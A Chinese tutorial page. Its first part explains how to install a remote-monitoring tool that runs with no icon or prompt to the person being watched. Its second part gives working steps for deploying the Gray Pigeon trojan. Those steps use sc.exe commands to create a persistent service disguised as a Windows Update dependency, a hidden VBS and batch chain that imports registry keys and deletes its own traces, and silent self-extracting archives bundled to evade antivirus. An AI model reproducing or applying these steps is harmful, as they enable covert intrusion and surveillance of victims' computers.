灰鸽子远程控制软件教程
灰鸽子远程控制软件教程

考虑到灰鸽子远程控制软件的特殊性，技术性较强和传插黑客技术要低调，将网络人远程控制软件教程放第一部份，灰鸽子远程控制软件教程放在了文章后面第二部份，请大家耐心观看）

第一部份：网络人远程监控软件

网络人远程控制个人版分为Netman办公版与Netman监控版。两个版本主要区别在于：Netman办公版连接远程电脑时，对方会弹出提示，知道电脑正在远程连接，主要用于个人远程控制、远程办公、远程协助和远程桌面连接等方面使用，是一款免费的远程控制软件；Netman监控版使用会员登录后再连接，远程电脑无任何提示，对方不会发觉，主要用于监管孩童电脑，掌握孩子上网情况，保护孩子健康上网。

Netman监控版详细安装方法：

1.要实现远程监控控制，双方都要安装Netman监控版，双方电脑的安装方法一样， 控制端同时也是被控端，只要知道ID和密码，双方可以互相控制。

2.下载软件解压缩后，双击“Netman监控版.EXE”，软件默认安装路径为“C:\Program
Files\Netman”，可以自己修改，但安装路径需要记住，因为启动软件桌面上不会新建快捷方式，需要自己进入安装文件夹，双击iexplore.exe启动软件，这时会弹出一个提示窗口，问是否要让软件随系统启动，通常直接点“确定”。

3.完成以上操作后，再按ctrl+y

即可呼出软件主界面。监控版必须使

用会员登录才能实现监控功能，所以呼出主界面后，应点击免费注册会员。

4.注册好会员后，点“选项”“会员登录”，填上注册好的会员号。

5.第一次使用会员登录时，会弹出“设置控制密码”选项，需要注意的是，这里修改的不是前面填写的“登录密码”，而是从其他电脑连接本电脑时需要输入的“控制密码”。很多用户会误以为这里是修改“登录密码”，导致第二次使用会员登录时，发现登录密码不正确。
出于安全考虑，网络人设置了“登录密码”与“控制密码”两道密码保护，“登录密码”用于登录会员ID，“控制密码”则是其他电脑想要控制本地电脑时所需要填写的密码。想要修改这两个密码，可点击“选项”-“修改密码”。

6.设置好密码密码后，点右上角的关闭按扭，软件就会在后台运行，桌面上看不到任何图标和提示。想要再次操作软件，请按下ctrl+y键。
右上角的关闭按扭只是将软件界面关闭，想要彻底退出软件，应点击左上角的“文件”-“退出”。很多用户想要卸载软件时，发现无卸载，就是因为没有退出程序造成。

7.有同样的方法在另一台电脑安装Netman监控版并使用另一个会员登录，在“远程IP/ID”处输入对方的会员ID和控制密码，点击“连接”即可连接远程电脑。

8.Netman监控版“连接”按扭左侧有一个“中转”选项，是通过网络人的服务器中转优化连接速度。通常不建议选择“中转”，因为连接速度正常时，选上反而会使得速度变慢。在没选择的情况下，软件

会根据网络状况，自行判断是否通过服务器中转。软件还有许多设置选项，在不了解功能的情况下，不要随意修改。

第二部份：灰鸽子教程

准备工具：鸽子服务端IcoSprite

图标更改器；SC.exe

服务添加删除更改工具；winrar

程序特点：

自解压形式，双击即可

制作过程：

1\. 首先自己配置一下鸽子服务端，配置时[启动项设置]这里面的都不要填，不要写入注册表，也不要用服务启动。其他的随你个人爱好。

2.用SC创建一个服务 运行CMD.EXE 在system32的目录下运行执行SC.exe create huigezi BinPath=
"%systemroot%\system32\gezi.exe" type=own type= interact start= auto
DisplayName= "gezi"
‘这句是用SC建立一个服务，服务名为huigezi，路径Binpath为"%systemroot%\system32\gezi.exe"，类型type为own
与interact交互，启动类型start为自动，显示名DisplayName为"gezi"。sc.exe descript_ion huigezi
"不死鸽子" ‘这句是将huigezi服务的描述改为“不死鸽子” sc config wuauserv depend= huigezi
‘配置huigezi使wuauserv服务依存此服务（wuauserv可以根据自己喜欢改成其它服务，这里的wuauserv是系统在Windows
Update网站的自动更新服务）。

这里的目的是迷惑管理员，使其不敢轻易停止我们生成的服务，自己也可以多加点。

3.将这些从注册表导出，我个人经验是：瑞星,咔吧等的注册表监控不会对导入注册表报警. 我们将他命名为1.reg

4.创建一个BAT文件,并命名为update.bat

@regedit /s %systemroot%\system32\1.reg

@%systemroot%\system32\gezi.exe

@del /q /f /s %systemroot%\system32\1.reg

@del /q /f /s %systemroot%\system32\Update.vbs

@del /q /f /s %systemroot%\system32\Update.bat

5.创建一个vbs并命名为update.vbs 目的是为了作用是令bat里的内容以安静模式执行，这样就可以让cmd窗口跳出来了，增加了不少隐蔽性。

里面写上如下代码：

On Error Resume Next

set wshshell=createobject ("wscript_.shell")

a=wshshell.run ("cmd.exe /C %systemroot%\system32\Update.bat", 0, TRUE)

6.用我门配置出来的服务端，并命名为run.exe，用run.exe做一个自解压文件，并命名为gezi.exe。记得将解压模式为全部隐藏，解压后运行run.exe，当然你的服务端要自己做免杀，这里我就不多说了。八仙过海....

7.将gezi.exe

1.reg Update.vbs

Update.bat

再用winrar制作一个自解压文件，解压到%systemroot%\system32\ 解压后运行Update.vbs
当然解压模式依旧全部隐藏，替换同名文件 现在用rar捆绑出来的文件很多杀软都不杀，你也可以用系统自带的捆绑机，或其他的捆绑机
这个方法可以用到其他的木马中捆出来的自解压文件也可以自己再加工:去掉右键用"winrar打开"。

你知道什么用了吗，相比灰鸽子远程控制软件教程，网络人远程控制软件教程更简单易懂得多。


